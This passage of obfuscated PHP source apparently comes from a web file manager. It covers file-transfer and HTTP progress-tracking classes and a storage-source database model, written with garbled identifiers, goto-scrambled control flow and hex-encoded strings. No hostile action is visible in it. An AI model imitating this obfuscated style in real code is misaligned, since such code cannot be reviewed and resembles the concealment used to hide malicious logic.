log($cõƒíÔ‚±‚) { write_log($cõƒíÔ‚±‚, $_SERVER[Š‰][1522]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto DĞˆË—”‚³; b–ÛŞŒÕßå: Hook::bind($b·×’Š£ëâ[561], array($this, $b·×’Š£ëâ[1528])); Hook::bind($b·×’Š£ëâ[562], array($this, $b·×’Š£ëâ[1529])); Hook::bind($b·×’Š£ëâ[564], array($this, $b·×’Š£ëâ[1530])); goto DÔé¯®èãå; aÖÅè‚¸: Hook::bind($b·×’Š£ëâ[534], array($this, $b·×’Š£ëâ[1531])); Hook::bind($b·×’Š£ëâ[536], array($this, $b·×’Š£ëâ[1531])); Hook::bind($b·×’Š£ëâ[538], array($this, $b·×’Š£ëâ[1531])); goto FÁøÂì•; cœ÷‘¹¹¤: $e›¸Ùåí„Š[$b·×’Š£ëâ[1000]] = $b·×’Š£ëâ[33]; $e›¸Ùåí„Š[$b·×’Š£ëâ[1545]] = $b·×’Š£ëâ[33]; $e›¸Ùåí„Š[$b·×’Š£ëâ[1546]] = 0; goto F§õŸöï“ˆ; D•¡ÆÒ˜È­: Hook::bind($b·×’Š£ëâ[1535], array($this, $b·×’Š£ëâ[1536])); Hook::bind($b·×’Š£ëâ[1537], array($this, $b·×’Š£ëâ[1538])); Hook::bind($b·×’Š£ëâ[1539], array($this, $b·×’Š£ëâ[1540])); goto a¶‚é÷ë††; BšÚƒ‰ˆ¨ø: Hook::bind($b·×’Š£ëâ[1523], array($this, $b·×’Š£ëâ[1524])); Hook::bind($b·×’Š£ëâ[1085], array($this, $b·×’Š£ëâ[1525])); Hook::bind($b·×’Š£ëâ[1526], array($this, $b·×’Š£ëâ[1527])); goto b–ÛŞŒÕßå; FÁøÂì•: Hook::bind($b·×’Š£ëâ[1532], array($this, $b·×’Š£ëâ[1533])); Hook::bind($b·×’Š£ëâ[554], array($this, $b·×’Š£ëâ[1534])); $this->sourceModelCopyFlag = !1; goto D•¡ÆÒ˜È­; DĞˆË—”‚³: $b·×’Š£ëâ =& $_SERVER[Š‰]; $e›¸Ùåí„Š =& $this->task; $this->sourceCopyFolder = !1; goto BšÚƒ‰ˆ¨ø; F§õŸöï“ˆ: $e›¸Ùåí„Š[$b·×’Š£ëâ[1547]] = 0; $e›¸Ùåí„Š[$b·×’Š£ëâ[1548]] = 0; if (!$e›¸Ùåí„Š[$b·×’Š£ëâ[1405]]) { $e›¸Ùåí„Š[$b·×’Š£ëâ[1405]] = LNG($b·×’Š£ëâ[1549]); } goto D‰ŠÀŠ§ÏÏ; a¶‚é÷ë††: $e›¸Ùåí„Š[$b·×’Š£ëâ[1541]] = LNG($b·×’Š£ëâ[1542]); $e›¸Ùåí„Š[$b·×’Š£ëâ[1543]] = 0; $e›¸Ùåí„Š[$b·×’Š£ëâ[1544]] = 0; goto cœ÷‘¹¹¤; DÔé¯®èãå: Hook::bind($b·×’Š£ëâ[565], array($this, $b·×’Š£ëâ[1530])); Hook::bind($b·×’Š£ëâ[532], array($this, $b·×’Š£ëâ[1531])); Hook::bind($b·×’Š£ëâ[529], array($this, $b·×’Š£ëâ[1531])); goto aÖÅè‚¸; D‰ŠÀŠ§ÏÏ: } protected function endAfter() { goto B·¥³ÜÈ‰¤; B·¥³ÜÈ‰¤: $BïƒÎ‰«×ˆ =& $_SERVER[Š‰]; Hook::unbind($BïƒÎ‰«×ˆ[1523], array($this, $BïƒÎ‰«×ˆ[1524])); Hook::unbind($BïƒÎ‰«×ˆ[1085], array($this, $BïƒÎ‰«×ˆ[1525])); goto CÎƒç··£; CÎƒç··£: Hook::unbind($BïƒÎ‰«×ˆ[1526], array($this, $BïƒÎ‰«×ˆ[1527])); Hook::unbind($BïƒÎ‰«×ˆ[561], array($this, $BïƒÎ‰«×ˆ[1528])); Hook::unbind($BïƒÎ‰«×ˆ[562], array($this, $BïƒÎ‰«×ˆ[1529])); goto béÂ„Æèø£; aÌå“Æ°¥«: Hook::unbind($BïƒÎ‰«×ˆ[529], array($this, $BïƒÎ‰«×ˆ[1531])); Hook::unbind($BïƒÎ‰«×ˆ[534], array($this, $BïƒÎ‰«×ˆ[1531])); Hook::unbind($BïƒÎ‰«×ˆ[536], array($this, $BïƒÎ‰«×ˆ[1531])); goto dìøÃŠÍ¤ë; DÏ‹Ø‚ïÒ™: Hook::unbind($BïƒÎ‰«×ˆ[1535], array($this, $BïƒÎ‰«×ˆ[1536])); Hook::unbind($BïƒÎ‰«×ˆ[1537], array($this, $BïƒÎ‰«×ˆ[1538])); Hook::unbind($BïƒÎ‰«×ˆ[1539], array($this, $BïƒÎ‰«×ˆ[1540])); goto e÷˜âğ§Ãò; béÂ„Æèø£: Hook::unbind($BïƒÎ‰«×ˆ[564], array($this, $BïƒÎ‰«×ˆ[1530])); Hook::unbind($BïƒÎ‰«×ˆ[565], array($this, $BïƒÎ‰«×ˆ[1530])); Hook::unbind($BïƒÎ‰«×ˆ[532], array($this, $BïƒÎ‰«×ˆ[1531])); goto aÌå“Æ°¥«; dìøÃŠÍ¤ë: Hook::unbind($BïƒÎ‰«×ˆ[538], array($this, $BïƒÎ‰«×ˆ[1531])); Hook::unbind($BïƒÎ‰«×ˆ[1532], array($this, $BïƒÎ‰«×ˆ[1533])); Hook::unbind($BïƒÎ‰«×ˆ[554], array($this, $BïƒÎ‰«×ˆ[1534])); goto DÏ‹Ø‚ïÒ™; e÷˜âğ§Ãò: } public function copyMoveStart($A…©‚•‡ëâ, $d•ñ‹ç£êÂ, $c‹êâ©„¶, $aàá—Ù …) { goto eŸä¡Ï†Õˆ; a‘¢ß›Ÿšâ: $FñƒÛİŒÁ[$Aó±¦‡÷ÀŠ[1551]] = KodIO::transferType($A…©‚•‡ëâ, $c‹êâ©„¶); $this->update(); goto Cßõà±ï´†; eİœËÚ¼: if (substr($d•ñ‹ç£êÂ, 0, strlen($CÔ ¶•ö—˜)) == $CÔ ¶•ö—˜) { return; } if (substr($aàá—Ù …, 0, strlen($CÔ ¶•ö—˜)) == $CÔ ¶•ö—˜) { return; } $FñƒÛİŒÁ =& $this->task; goto a‘¢ß›Ÿšâ; eŸä¡Ï†Õˆ: $Aó±¦‡÷ÀŠ =& $_SERVER[Š‰]; self::log($Aó±¦‡÷ÀŠ[1550] . $d•ñ‹ç£êÂ . $Aó±¦‡÷ÀŠ[66] . $aàá—Ù …); $CÔ ¶•ö—˜ = rtrim(TEMP_FILES, $Aó±¦‡÷ÀŠ[8]); goto eİœËÚ¼; Cßõà±ï´†: } public function updateAfter() { goto aÈ¶Š¨ã; d„Ï¿“òîë: $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1501]] = $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1548]] / $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[711]]; if ($Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1501]] > 0) { $C£‡ŞÇ®é = timeFloat() - $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[733]] - $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1504]]; $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1505]] = $C£‡ŞÇ®é * (1 - $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1501]]) / $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1501]]; } goto eİÌÀ“¾§; E®ƒÜÆ±: if ($this->sourceModelCopyFlag) { return; } if ($Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1551]] == $FÑ¹éÈ·¶å[1157]) { return; } if ($Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1551]] == $FÑ¹éÈ·¶å[1070] || $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1551]] == $FÑ¹éÈ·¶å[106]) { if ($Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1545]]) { $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1548]] = $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1547]] + $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1544]]; } } else { if ($Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1551]] == $FÑ¹éÈ·¶å[1158]) { if ($Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1545]] == $FÑ¹éÈ·¶å[1070]) { $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1548]] = $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1547]] + $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1544]] * 0.5; } else { if ($Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1545]] == $FÑ¹éÈ·¶å[106]) { $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1548]] = $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1547]] + $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1543]] * 0.5 + $Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[1544]] * 0.5; } } } } goto d„Ï¿“òîë; aÈ¶Š¨ã: $FÑ¹éÈ·¶å =& $_SERVER[Š‰]; $Aá°ƒğ¿ó‘ =& $this->task; if (!$Aá°ƒğ¿ó‘[$FÑ¹éÈ·¶å[711]]) { return; } goto E®ƒÜÆ±; eİÌÀ“¾§: } public function addPath($AÕ´ùØÚ¥Š) { goto A±Šåä­‚‚; A±Šåä­‚‚: $b”Ù¶ôîÌ =& $_SERVER[Š‰]; if (!$AÕ´ùØÚ¥Š) { return; } $dßá´œ²¤ =& $this->task; goto Fô¾±•šŒº; Fô¾±•šŒº: $fÁÅÂ’é¥— = IO::infoWithChildren($AÕ´ùØÚ¥Š); $FİÀ¿ÊÄÀÏ = $dßá´œ²¤[$b”Ù¶ôîÌ[1552]] ? $dßá´œ²¤[$b”Ù¶ôîÌ[1552]][$b”Ù¶ôîÌ[1553]] : 0; $dßá´œ²¤[$b”Ù¶ôîÌ[1552]] = array($b”Ù¶ôîÌ[1553] => $FİÀ¿ÊÄÀÏ + 1, $b”Ù¶ôîÌ[407] => $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[28]], $b”Ù¶ôîÌ[75] => $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[75]], $b”Ù¶ôîÌ[489] => $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[489]] ? $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[489]] : $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[75]]); goto b¦Ó‚ñØ; b¦Ó‚ñØ: if ($fÁÅÂ’é¥—[$b”Ù¶ôîÌ[29]] == $b”Ù¶ôîÌ[173]) { $dßá´œ²¤[$b”Ù¶ôîÌ[998]] += 1; } else { $dßá´œ²¤[$b”Ù¶ôîÌ[998]] += $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[80]][$b”Ù¶ôîÌ[78]]; if ($fÁÅÂ’é¥—[$b”Ù¶ôîÌ[390]]) { $dßá´œ²¤[$b”Ù¶ôîÌ[998]] += $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[80]][$b”Ù¶ôîÌ[79]] + 1; } } $dßá´œ²¤[$b”Ù¶ôîÌ[711]] += $fÁÅÂ’é¥—[$b”Ù¶ôîÌ[77]]; $this->update(); goto f›ïÅ¯óØî; f›ïÅ¯óØî: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($cù»›¾—£á) { $A‹£¬¬¥ì³ =& $_SERVER[Š‰]; $c‚àÊóğ±¢ =& $this->task; $c‚àÊóğ±¢[$A‹£¬¬¥ì³[1541]] = $cù»›¾—£á[$A‹£¬¬¥ì³[28]]; $c‚àÊóğ±¢[$A‹£¬¬¥ì³[1000]] = $cù»›¾—£á[$A‹£¬¬¥ì³[28]]; $this->update(); } public function copyFileStart($D¦•òƒªìø, $AÉÀ®´¥óÕ, $C¾Ñõ¢ö÷³, $Aêó“Ôİ÷, $d…‚¤£Ä‚“, $CÔÛ¤ù˜µÒ) { goto d¤“£†Ç¾ù; e¦¸ˆ¶•†Á: $this->update(); goto Båö¯è¢¤‡; A§äµ«è˜: $F¶è–›¸íó[$Càè“º±[1541]] = $B¹õ±¬“–; $F¶è–›¸íó[$Càè“º±[1543]] = (int) $D¦•òƒªìø->size($AÉÀ®´¥óÕ); $F¶è–›¸íó[$Càè“º±[1544]] = 0; goto d»§óí‘¡; d¤“£†Ç¾ù: $Càè“º± =& $_SERVER[Š‰]; $B¹õ±¬“– = $d…‚¤£Ä‚“; if ($B¹õ±¬“– == $GLOBALS[$Càè“º±[1554]]) { $B¹õ±¬“– = $GLOBALS[$Càè“º±[1555]]; } goto Bƒ”£·æô; d»§óí‘¡: $F¶è–›¸íó[$Càè“º±[1000]] = $Càè“º±[33]; $F¶è–›¸íó[$Càè“º±[1545]] = $Càè“º±[33]; $F¶è–›¸íó[$Càè“º±[1546]] = 0; goto e¦¸ˆ¶•†Á; Bƒ”£·æô: $GLOBALS[$Càè“º±[1555]] = $d…‚¤£Ä‚“; $GLOBALS[$Càè“º±[1554]] = $CÔÛ¤ù˜µÒ; $F¶è–›¸íó =& $this->task; goto A§äµ«è˜; Båö¯è¢¤‡: } public function copyFileEnd($DÒŠ»¯àœ, $c„Ü£‰¼Úó, $Eƒ‡ğÈ¶Ë£, $bĞáõö‘›ã, $aÂäÀ¶œÙ¸, $Açï»¥¶’‡) { $E»õôˆÄ¼ƒ =& $_SERVER[Š‰]; $E«õ»«ÀÉ =& $this->task; $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1544]] = $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1543]]; $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1545]] = $E»õôˆÄ¼ƒ[33]; if ($aÂäÀ¶œÙ¸ == $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1541]]) { $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1547]] += $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1543]]; $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1548]] = $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1547]]; $this->update(1); } else { $this->update(); $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1544]] = 0; } self::log($E»õôˆÄ¼ƒ[1556] . $c„Ü£‰¼Úó . $E»õôˆÄ¼ƒ[66] . $bĞáõö‘›ã . $E»õôˆÄ¼ƒ[227] . $aÂäÀ¶œÙ¸ . $E»õôˆÄ¼ƒ[1557] . $E«õ»«ÀÉ[$E»õôˆÄ¼ƒ[1541]]); } public function updateFileEnd($EÅğË–ÒÔá, $c³î¼éŠ™) { goto Eˆ»ª“°ª; Eˆ»ª“°ª: $d£†‘–¿‹ğ =& $_SERVER[Š‰]; $C‘½‘±¹« =& $this->task; $C‘½‘±¹«[$d£†‘–¿‹ğ[1541]] = $EÅğË–ÒÔá; goto Bğ…ê—´ƒ; DÀ†Ø¸›Œ: $this->update(1); self::log($d£†‘–¿‹ğ[1558] . $EÅğË–ÒÔá); goto e”¢­ğ¶×¾; Bğ…ê—´ƒ: $C‘½‘±¹«[$d£†‘–¿‹ğ[1543]] = $c³î¼éŠ™; $C‘½‘±¹«[$d£†‘–¿‹ğ[1547]] += $c³î¼éŠ™; $C‘½‘±¹«[$d£†‘–¿‹ğ[1548]] = $C‘½‘±¹«[$d£†‘–¿‹ğ[1547]]; goto DÀ†Ø¸›Œ; e”¢­ğ¶×¾: } public function sourceModelCopy($f™ª£ºÔë) { goto aŠ‡´½ÄÉ‚; eº—î›ŸÃ: switch ($bª©—×œéÓ) { case $fÃ¹øâÑ¾ñ[530]: $bÄñ·Áßè = 1; break; case $fÃ¹øâÑ¾ñ[533]: $CõìŠãˆ…±[$fÃ¹øâÑ¾ñ[1541]] = $b³¢¦Øõ‚[$fÃ¹øâÑ¾ñ[28]]; break; case $fÃ¹øâÑ¾ñ[535]: $bÄñ·Áßè = intval($f™ª£ºÔë[$fÃ¹øâÑ¾ñ[375]] * 0.4); break; case $fÃ¹øâÑ¾ñ[537]: $bÄñ·Áßè = intval($f™ª£ºÔë[$fÃ¹øâÑ¾ñ[375]] * 0.2); break; case $fÃ¹øâÑ¾ñ[539]: $bÄñ·Áßè = intval($f™ª£ºÔë[$fÃ¹øâÑ¾ñ[375]] * 0.4); break; } $this->update($bÄñ·Áßè); $this->sourceModelCopyFlag = !1; goto DÆÅŠ¹Òù›; a¨Ü¡³Î¶è: $CõìŠãˆ…± =& $this->task; $this->sourceModelCopyFlag = !0; $bÄñ·Áßè = 0; goto eº—î›ŸÃ; aŠ‡´½ÄÉ‚: $fÃ¹øâÑ¾ñ =& $_SERVER[Š‰]; $bª©—×œéÓ = $f™ª£ºÔë[0]; $b³¢¦Øõ‚ = $f™ª£ºÔë[1]; goto a¨Ü¡³Î¶è; DÆÅŠ¹Òù›: } public function sourceRemove($dÂ¿¬‡ïĞ, $eíÍ›²‡Ó£) { $E¾Å¸½°²® =& $_SERVER[Š‰]; $this->sourceModelCopyFlag = !0; $CÁŠ÷²º„† = 1; if (isset($dÂ¿¬‡ïĞ[$E¾Å¸½°²®[80]])) { $CÁŠ÷²º„† = $dÂ¿¬‡ïĞ[$E¾Å¸½°²®[80]][$E¾Å¸½°²®[78]] + $dÂ¿¬‡ïĞ[$E¾Å¸½°²®[80]][$E¾Å¸½°²®[79]] + 1; } $this->update($CÁŠ÷²º„†); $this->sourceModelCopyFlag = !1; } public function sourceMove($F‡×Ÿ™—¯) { $this->sourceRemove($F‡×Ÿ™—¯, !1); } public function curlProgress($c©ºìƒÔš, $EÅ¡Ãôß„Ä, $bÉä¤ô†İ, $BŒ¼Åô”Î, $D‹Ğ‰ˆ¨é) { $BªÄŞ°âÜç =& $_SERVER[Š‰]; $døâ‹…§‡Ö =& $this->task; if ($D‹Ğ‰ˆ¨é > 0) { $døâ‹…§‡Ö[$BªÄŞ°âÜç[1000]] = $BªÄŞ°âÜç[1559]; $døâ‹…§‡Ö[$BªÄŞ°âÜç[1545]] = $BªÄŞ°âÜç[106]; if ($døâ‹…§‡Ö[$BªÄŞ°âÜç[1543]]) { $døâ‹…§‡Ö[$BªÄŞ°âÜç[1544]] = $D‹Ğ‰ˆ¨é; } if ($døâ‹…§‡Ö[$BªÄŞ°âÜç[1546]]) { $døâ‹…§‡Ö[$BªÄŞ°âÜç[1544]] = $D‹Ğ‰ˆ¨é + $døâ‹…§‡Ö[$BªÄŞ°âÜç[1546]]; } } else { if ($bÉä¤ô†İ > 0) { if ($døâ‹…§‡Ö[$BªÄŞ°âÜç[1543]] == $EÅ¡Ãôß„Ä) { $døâ‹…§‡Ö[$BªÄŞ°âÜç[1544]] = $bÉä¤ô†İ; $døâ‹…§‡Ö[$BªÄŞ°âÜç[1000]] = $BªÄŞ°âÜç[1560]; $døâ‹…§‡Ö[$BªÄŞ°âÜç[1545]] = $BªÄŞ°âÜç[1070]; } } } $this->update(); } public function curlProgressStart($dæ¨ÖŞ‹Ñ) { } public function curlProgressEnd($f¹ÆåÁ×ÌÆ) { goto cë²ª£Ôó±; B¶İ–Ÿ‘ğİ: $this->update(); goto BÂÏºÓš¬—; d‚‡±ö®ƒô: $eùåÔù™îğ = $c©–§ÔÓËé[$dáÙ”õéÃÕ[1561]]; if ($eùåÔù™îğ == -1) { $eùåÔù™îğ = $c©–§ÔÓËé[$dáÙ”õéÃÕ[1562]]; } if ($FÂëãÈÂï‚[$dáÙ”õéÃÕ[1545]] == $dáÙ”õéÃÕ[106] && $eùåÔù™îğ) { $FÂëãÈÂï‚[$dáÙ”õéÃÕ[1546]] += $eùåÔù™îğ; } goto B¶İ–Ÿ‘ğİ; cë²ª£Ôó±: $dáÙ”õéÃÕ =& $_SERVER[Š‰]; $FÂëãÈÂï‚ =& $this->task; $c©–§ÔÓËé = curl_getinfo($f¹ÆåÁ×ÌÆ); goto d‚‡±ö®ƒô; BÂÏºÓš¬—: } } class TaskHttp extends Task { protected function startAfter() { $cŒÀ«–¿ĞÖ =& $_SERVER[Š‰]; $d†‡Œ»ƒ =& $this->task; $d†‡Œ»ƒ[$cŒÀ«–¿ĞÖ[1563]] = 1; Hook::bind($cŒÀ«–¿ĞÖ[1535], array($this, $cŒÀ«–¿ĞÖ[1564])); Hook::bind($cŒÀ«–¿ĞÖ[1537], array($this, $cŒÀ«–¿ĞÖ[1565])); Hook::bind($cŒÀ«–¿ĞÖ[1539], array($this, $cŒÀ«–¿ĞÖ[1566])); } protected function endAfter() { $e„˜„ÌÃ´ñ =& $_SERVER[Š‰]; Hook::unbind($e„˜„ÌÃ´ñ[1535], array($this, $e„˜„ÌÃ´ñ[1564])); Hook::unbind($e„˜„ÌÃ´ñ[1537], array($this, $e„˜„ÌÃ´ñ[1565])); Hook::unbind($e„˜„ÌÃ´ñ[1539], array($this, $e„˜„ÌÃ´ñ[1566])); } public function progressStart($d†´âàÎ¥Ò) { $F¸©¦¤ÏÊ³ =& $_SERVER[Š‰]; $CÕ¾‹ÌÏä = curl_getinfo($d†´âàÎ¥Ò); self::log($F¸©¦¤ÏÊ³[1567] . $CÕ¾‹ÌÏä[$F¸©¦¤ÏÊ³[303]]); self::valueSet($this->task[$F¸©¦¤ÏÊ³[388]], $this->task); } public function progressEnd($döÚŞ–•ÄÄ) { $c—šÚ¾×ÌÁ =& $_SERVER[Š‰]; self::log($c—šÚ¾×ÌÁ[1568] . $this->task[$c—šÚ¾×ÌÁ[388]]); $this->end(); } public function progress($F“èµ«Œ‘‚, $A¤‰»ÍËçÃ, $fŞä¹ã¤šø, $Fíªº“÷Ê‡, $B“ÅÇÏßÎ) { $D…°²Ô£êÇ =& $_SERVER[Š‰]; $D÷»¦ƒƒ»é =& $this->task; if ($B“ÅÇÏßÎ > 0) { $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[998]] = $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[998]] == 0 ? $Fíªº“÷Ê‡ : $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[998]]; $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[1012]] = $B“ÅÇÏßÎ; } else { if ($fŞä¹ã¤šø > 0) { $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[998]] = $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[998]] == 0 ? $A¤‰»ÍËçÃ : $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[998]]; $D÷»¦ƒƒ»é[$D…°²Ô£êÇ[1012]] = $fŞä¹ã¤šø; } } $this->update(); self::log("\x70\162\x6f\147\x72\145\x73\x73\110\164\x74\x70\72\x64\x6f\167\156\72{$fŞä¹ã¤šø}\x2f{$A¤‰»ÍËçÃ}\x3b\40\165\x70\x6c\157\x61\x64\72{$B“ÅÇÏßÎ}\x2f{$Fíªº“÷Ê‡}\x3b"); } } goto CÂˆŸ¤éˆ; d¡×ø—Ó¶: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\162\x63\145"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\x6d\x65" => "\151\x6f\x5f\x73\157\165\162\x63\145\137\x6d\x65\x74\x61", "\x6d\145\164\x61\x46\x69\145\x6c\x64" => "\x73\157\x75\162\x63\x65\111\104"); protected $dataAuto = array(array("\x6d\157\144\151\146\x79\x54\x69\155\x65", "\x74\x69\x6d\x65", "\151\x6e\163\145\162\164", "\146\x75\156\143\164\151\157\x6e"), array("\x63\162\145\x61\164\x65\124\x69\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\145\x72\164", "\146\x75\156\x63\x74\x69\x6f\x6e"), array("\166\x69\145\x77\124\x69\x6d\x65", "\164\x69\x6d\145", "\151\x6e\163\145\x72\164", "\146\x75\156\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($d§‡œÒÜ×‚) { return $this->listSource(array($_SERVER[Š‰][389] => $d§‡œÒÜ×‚)); } public function typeName($A›éœôğæã) { static $bÕôÀˆà‘ª = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\162\157\x75\160"); return $bÕôÀˆà‘ª[$A›éœôğæã . $_SERVER[Š‰][33]]; } public function sourceListInfo($b„öÈ†áŞ, $FŞÍ®„À²È = false) { goto EÇ­ƒªœ•; DÎÙ»ÏİëÖ: if (!$b„öÈ†áŞ) { return array(); } $bßŸè‹î°é = $this->where(array($D¤Ëî¿°[390] => array($D¤Ëî¿°[7], $b„öÈ†áŞ)))->select(); $this->_listDataApply($bßŸè‹î°é, $FŞÍ®„À²È); goto Fµ÷‚†¶ßµ; Fµ÷‚†¶ßµ: return array_to_keyvalue($bßŸè‹î°é, $D¤Ëî¿°[390]); goto aÎ±Š¿¡ø³; EÇ­ƒªœ•: $D¤Ëî¿° =& $_SERVER[Š‰]; $b„öÈ†áŞ = $b„öÈ†áŞ ? $b„öÈ†áŞ : array(); $b„öÈ†áŞ = array_filter(array_unique($b„öÈ†áŞ)); goto DÎÙ»ÏİëÖ; aÎ±Š¿¡ø³: } public function pathInfoFilter(&$cÃ®æ­åŒ) { goto BäÕù„¾âó; Aö©—•â†: $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[398]] = $this->typeName($cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[398]]); if ($cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[397]] != 1) { $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[167]] = $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[399]]; unset($cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[399]]); } $b¯Ëï½¨„¥ = $F‚®ô‘”¬Ö; goto Däù‡¨øÆ¶; BäÕù„¾âó: $E¥Å¼ÔÊ¨º =& $_SERVER[Š‰]; static $F‚®ô‘”¬Ö = false; static $F‚ÀÒƒ»ö = false; goto C¤Œ¤ëÓ”; Däù‡¨øÆ¶: if (isset($cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[400]]) && $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[400]][$E¥Å¼ÔÊ¨º[401]] == -1) { $b¯Ëï½¨„¥ = $F‚ÀÒƒ»ö; } $cÃ®æ­åŒ = array_field_key($cÃ®æ­åŒ, $b¯Ëï½¨„¥); return $cÃ®æ­åŒ; goto c…˜Â­ìÍÓ; C¤Œ¤ëÓ”: if (!$F‚®ô‘”¬Ö) { goto EßåîÖèÒ; EßåîÖèÒ: $eÏ¦ï¥‘ï = $E¥Å¼ÔÊ¨º[391]; $eÏ¦ï¥‘ï .= $E¥Å¼ÔÊ¨º[392]; $eÏ¦ï¥‘ï .= $E¥Å¼ÔÊ¨º[393]; goto fìŠ»â­ïŸ; fìŠ»â­ïŸ: $D®£¤ÙÆ¿° = $E¥Å¼ÔÊ¨º[394]; $EåíñÁó´ñ = explode($E¥Å¼ÔÊ¨º[47], $D®£¤ÙÆ¿°); $F‚®ô‘”¬Ö = explode($E¥Å¼ÔÊ¨º[47], $eÏ¦ï¥‘ï); goto A„å‰¼ƒ¡Ÿ; A„å‰¼ƒ¡Ÿ: $F‚ÀÒƒ»ö = array(); foreach ($F‚®ô‘”¬Ö as $Añ‰¿¾¸ğå) { if (in_array($Añ‰¿¾¸ğå, $EåíñÁó´ñ)) { continue; } $F‚ÀÒƒ»ö[] = $Añ‰¿¾¸ğå; } goto D¦ñ‹Ãºš; D¦ñ‹Ãºš: } $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[75]] = $E¥Å¼ÔÊ¨º[395] . $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[390]] . $E¥Å¼ÔÊ¨º[396]; $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[29]] = $cÃ®æ­åŒ[$E¥Å¼ÔÊ¨º[397]] == 1 ? $E¥Å¼ÔÊ¨º[76] : $E¥Å¼ÔÊ¨º[173]; goto Aö©—•â†; c…˜Â­ìÍÓ: } public function listUserFav() { goto DáˆÔ¸éé†; DáˆÔ¸éé†: $dÀ«›º»Š =& $_SERVER[Š‰]; $eÃïŠÃŞù« = Model($dÀ«›º»Š[402])->listData(); $c×œ—È¦êŸ = array_filter_by_field($eÃïŠÃŞù«, $dÀ«›º»Š[29], $dÀ«›º»Š[403]); goto EŸ©¾ï´•; D–öŒÓ†˜È: foreach ($eÃïŠÃŞù« as &$EÚöï“ÄòÒ) { $EÚöï“ÄòÒ = array($dÀ«›º»Š[406] => $EÚöï“ÄòÒ[$dÀ«›º»Š[388]], $dÀ«›º»Š[407] => $EÚöï“ÄòÒ[$dÀ«›º»Š[28]], $dÀ«›º»Š[408] => $EÚöï“ÄòÒ[$dÀ«›º»Š[75]], $dÀ«›º»Š[409] => $EÚöï“ÄòÒ[$dÀ«›º»Š[29]], $dÀ«›º»Š[410] => $EÚöï“ÄòÒ[$dÀ«›º»Š[192]], $dÀ«›º»Š[411] => $EÚöï“ÄòÒ[$dÀ«›º»Š[83]]); if ($EÚöï“ÄòÒ[$dÀ«›º»Š[29]] == $dÀ«›º»Š[403] && $fœƒÍÜ²™´[$EÚöï“ÄòÒ[$dÀ«›º»Š[75]]]) { $EÚöï“ÄòÒ[$dÀ«›º»Š[84]] = $fœƒÍÜ²™´[$EÚöï“ÄòÒ[$dÀ«›º»Š[75]]]; } } unset($EÚöï“ÄòÒ); return $eÃïŠÃŞù«; goto A­§ÑÅš³Ü; EŸ©¾ï´•: 